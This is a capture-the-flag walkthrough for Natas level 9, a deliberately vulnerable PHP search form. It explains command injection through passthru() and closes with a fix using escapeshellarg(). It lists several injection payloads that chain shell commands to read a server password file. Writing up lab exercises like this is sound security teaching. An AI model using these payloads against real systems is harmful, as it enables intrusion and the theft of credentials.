</div>Natas Level 9: Command Injection
What You See
A search form with a "needle" input field
The source code reveals:
php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
The Vulnerability: passthru() with Unsanitized Input
The code takes your input and directly injects it into a shell command:
bash
grep -i [YOUR_INPUT] dictionary.txt
No sanitization. No validation. Your input is executed as part of a shell command.
The Exploit: Command Injection
Since $key is inserted directly into the command string, you can inject additional commands using shell operators.
Goal: Read the password file at /etc/natas_webpass/natas10
Payloads to Try
Method 1: Command chaining with ;
plain
; cat /etc/natas_webpass/natas10
Full command becomes:
bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
The ; terminates grep and starts a new command.
Method 2: Command substitution with $()
plain
$(cat /etc/natas_webpass/natas10)
Method 3: Pipe chaining
plain
| cat /etc/natas_webpass/natas10
Method 4: AND operator
plain
&& cat /etc/natas_webpass/natas10
Recommended Payload
Enter this in the "needle" field:
plain
; cat /etc/natas_webpass/natas10
Or try:
plain
| cat /etc/natas_webpass/natas10
Why It Works
Table
Operator	Effect
;	Run next command regardless of success
&&	Run next command only if previous succeeds
|	Pipe output of previous into next
$(...)	Command substitution — execute and insert output
The server executes:
bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
grep -i runs with empty pattern (fails silently), then cat runs and dumps the password file.
Key Takeaways
Table
Lesson	Explanation
Never pass user input to passthru(), exec(), system()	These execute shell commands — extremely dangerous
Always sanitize/escape shell arguments	Use escapeshellarg() in PHP
Use parameterized queries for OS commands too	Prefer APIs over shell execution
Principle of least privilege	Web server shouldn't read password files
Defense: Secure Code
php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    // Escape the argument properly
    $safe_key = escapeshellarg($key);
    passthru("grep -i $safe_key dictionary.txt");
}
?>
escapeshellarg() wraps the input in single quotes and escapes any quotes inside, preventing command injection.
